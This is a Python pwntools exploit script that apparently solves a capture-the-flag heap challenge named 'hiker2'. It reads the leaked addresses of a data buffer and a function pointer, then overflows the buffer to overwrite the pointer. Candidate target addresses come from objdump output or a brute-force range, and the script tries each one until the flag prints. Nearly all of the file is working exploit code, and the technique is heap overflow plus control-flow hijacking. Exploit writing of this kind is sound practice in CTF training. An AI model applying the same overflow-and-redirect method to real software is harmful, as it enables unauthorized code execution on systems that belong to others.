#!/usr/bin/env python3

# Hiker2 Heap Exploitation
# The binary allocates heap memory and shows addresses of 'data' and 'fp' (function pointer)
# We need to overflow 'data' to overwrite 'fp' and redirect execution

from pwn import *

context.binary = elf = ELF('./hiker2')
context.log_level = 'info'

def find_target_function():
    
    # Disassemble the binary to find the hidden function that prints the flag
    
    log.info("Searching for target function...")
    
    # Let's try to find it by looking at the binary
    with open('./hiker2', 'rb') as f:
        data = f.read()
        
        # Look for common strings that might indicate the win function
        if b'flag{' in data:
            offset = data.find(b'flag{')
            log.success(f"Found 'flag{{' string at offset: {hex(offset)}")
        
        if b'passed' in data or b'success' in data or b'correct' in data:
            log.info("Found success indicators in binary")
    
    # Use objdump to find functions
    try:
        import subprocess
        result = subprocess.check_output(['objdump', '-d', './hiker2'], text=True)
        
        # Find all function addresses
        functions = []
        for line in result.split('\n'):
            if '<' in line and '>:' in line:
                addr_str = line.split()[0]
                func_name = line.split('<')[1].split('>')[0]
                try:
                    addr = int(addr_str, 16)
                    if 0x08048000 < addr < 0x08050000:
                        functions.append((addr, func_name))
                        log.info(f"Found function: {func_name} @ {hex(addr)}")
                except:
                    pass
        
        # Return addresses to try (excluding common ones like main, plt entries)
        possible_targets = [addr for addr, name in functions 
                          if name not in ['main', '_start', '__libc_start_main', 
                                         'frame_dummy', 'register_tm_clones']]
        
        return possible_targets
        
    except:
        log.warning("objdump failed, using default addresses")
        # Brute force range around typical function locations
        possible_targets = []
        for addr in range(0x08049160, 0x08049250, 1):
            possible_targets.append(addr)
        return possible_targets

def exploit():    
    # Step 1: Run once to get addresses
    p = process(['./hiker2', 'AAAA'])
    
    output = p.recvline().decode()
    log.info(output)
    
    # Parse addresses: "data is at 0xXXXXXXXX, fp is at 0xXXXXXXXX"
    parts = output.split(',')
    data_addr = int(parts[0].split('0x')[1], 16)
    fp_addr = int(parts[1].split('0x')[1], 16)
    
    # Calculate distance between data and fp
    distance = fp_addr - data_addr
    
    p.close()
    
    # Step 2: Try common target addresses
    possible_targets = find_target_function()
    
    log.info("\nStep 2: Trying possible target addresses...")
    
    for target in possible_targets:
        log.info(f"\nTrying target address: {hex(target)}")
        # Build payload: padding + target address
        payload = b'A' * distance
        payload += p32(target)  # Overwrite fp with target address
        
        try:
            p = process(['./hiker2', payload])
            output = p.recvall(timeout=2).decode()
            
            if 'flag{' in output:
                log.success(f"Output:\n{output}")
                return output
            else:
                log.info(f"Output: {output[:100]}")
                
        except Exception as e:
            log.warning(f"Crash or error: {e}")
        p.close()
    return None

if __name__ == '__main__':
    result = exploit()